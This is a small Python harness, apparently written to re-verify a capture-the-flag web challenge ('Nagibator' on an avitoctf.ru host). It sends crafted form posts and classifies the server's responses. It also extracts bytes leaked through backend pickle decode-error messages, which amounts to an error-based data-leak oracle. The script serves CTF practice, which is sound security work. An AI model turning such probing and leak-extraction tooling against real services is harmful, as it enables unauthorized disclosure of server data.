#!/usr/bin/env python3
"""Shared live harness for task9 Nagibator re-verification. Uses repo .venv requests."""
import requests, re
U = "https://nagibator-r36lsxww.avitoctf.ru/"
S = requests.Session()
def post(extra, discount="30", time_amt="23:59", pressure="5", trumps=("other",),
         extra_fields=None, path="/", method="POST", timeout=25):
    data = [("discount", discount), ("time_amt", time_amt), ("pressure", pressure)]
    for t in ((trumps,) if isinstance(trumps, str) else trumps):
        data.append(("trumps", t))
    data.append(("extra", extra))
    if extra_fields:
        for k, v in extra_fields.items():
            data.append((k, v))
    if method == "POST":
        return S.post(U.rstrip("/")+path, data=data, timeout=timeout)
    return S.get(U.rstrip("/")+path, params=dict(data), timeout=timeout)
def classify(t):
    if "Backend вернул 500" not in t:
        if "Ошибка" in t:
            m = re.search(r"Ошибка:?\s*([^<]{0,120})", t); return "FE-ERR", (m.group(1) if m else None)
        h = re.search(r"<h2>([^<]*)</h2>", t); return "PERSONA", (h.group(1) if h else None)
    if "&lt;!doctype" in t.lower(): return "BUILDER-CRASH-500", None
    d = re.search(r"&#34;detail&#34;:&#34;(.*?)&#34;,&#34;error&#34;", t) or re.search(r'"detail":"(.*?)","error"', t)
    return "PICKLE", (d.group(1) if d else "?")
def leaked(detail):
    m = re.search(r"byte (0x[0-9a-f]+) in position (\d+)", detail or "")
    return (int(m.group(1),16), int(m.group(2))) if m else None
def probe(extra, **kw):
    r = post(extra, **kw); c, d = classify(r.text); return c, d, r
def g2(a, b): return ((a & 3) << 6) | ((b >> 2) & 0x3f)
if __name__ == "__main__":
    c,d,_ = probe("нагибатор."); print("selftest:", c, d)
